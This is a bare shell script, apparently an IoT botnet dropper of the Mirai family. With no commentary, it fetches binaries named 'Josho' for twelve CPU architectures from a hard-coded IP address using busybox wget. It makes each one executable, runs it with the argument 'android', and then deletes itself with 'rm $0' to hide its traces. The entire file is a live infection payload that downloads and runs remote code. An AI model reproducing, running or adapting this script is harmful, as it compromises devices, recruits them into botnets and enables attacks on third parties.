busybox wget http://213.202.211.46/AB4g5/Josho.arm; chmod 777 Josho.arm; ./Josho.arm android
busybox wget http://213.202.211.46/AB4g5/Josho.arm5; chmod 777 Josho.arm5; ./Josho.arm5 android
busybox wget http://213.202.211.46/AB4g5/Josho.arm6; chmod 777 Josho.arm6; ./Josho.arm6 android
busybox wget http://213.202.211.46/AB4g5/Josho.arm7; chmod 777 Josho.arm7; ./Josho.arm7 android
busybox wget http://213.202.211.46/AB4g5/Josho.m68k; chmod 777 Josho.m68k; ./Josho.m68k android
busybox wget http://213.202.211.46/AB4g5/Josho.mips; chmod 777 Josho.mips; ./Josho.mips android
busybox wget http://213.202.211.46/AB4g5/Josho.mpsl; chmod 777 Josho.mpsl; ./Josho.mpsl android
busybox wget http://213.202.211.46/AB4g5/Josho.ppc; chmod 777 Josho.ppc; ./Josho.ppc android
busybox wget http://213.202.211.46/AB4g5/Josho.sh4; chmod 777 Josho.sh4; ./Josho.sh4 android
busybox wget http://213.202.211.46/AB4g5/Josho.spc; chmod 777 Josho.spc; ./Josho.spc android
busybox wget http://213.202.211.46/AB4g5/Josho.x86; chmod 777 Josho.x86; ./Josho.x86 android
busybox wget http://213.202.211.46/AB4g5/Josho.x86_64; chmod 777 Josho.x86_64; ./Josho.x86_64 android

rm $0
